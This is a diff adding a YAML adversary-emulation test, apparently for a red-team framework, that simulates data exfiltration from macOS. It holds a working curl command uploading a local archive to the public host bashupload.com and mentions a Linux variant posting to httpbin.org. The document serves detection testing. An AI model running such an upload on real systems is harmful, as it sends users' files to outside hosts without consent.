@@ -1,0 +1,45 @@
+---
+api_version: 2.0
+uuid: 4e9c1f8a-3b7d-4c6e-8a1b-9f0e2d5c4a3b
+name: exfiltrate-file-via-curl
+authors:
+  - godlovepenn
+description: |
+  Uploads a local file from a macOS endpoint to a public file hosting service
+  (bashupload.com) using the native curl utility. The server's response, which
+  includes the public URL for the uploaded file, is printed to standard output.
+
+  See also: exfiltration-curl for a Linux variant that base64-encodes data and
+  POSTs to httpbin.org.
+
+mitre:
+  tactics:
+    - "TA0010 Exfiltration"
+  techniques:
+    - "T1567 Exfiltration Over Web Service"
+  subtechniques:
+    - "T1567.001 Exfiltration Over Web Service: Exfiltration to Code Repository"
+
+requirements:
+  platforms:
+    - os: darwin
+  superuser: false
+
+args:
+  - name: local_file_path
+    description: The full path to the local file that will be uploaded.
+    type: path
+    default: "archived-docs.tar.gz"
+  - name: remote_filename
+    description: The desired name for the file on the remote server.
+    type: string
+    default: "data.tar.gz"
+
+steps:
+  - name: upload_file_with_curl
+    description: |
+      Uses curl's --upload-file option to stream the specified local file
+      to bashupload.com. The output will contain the URL to the uploaded file.
+    executor: bash
+    inline: |
+      curl -T "{{.Args.local_file_path}}" https://bashupload.com/{{.Args.remote_filename}}
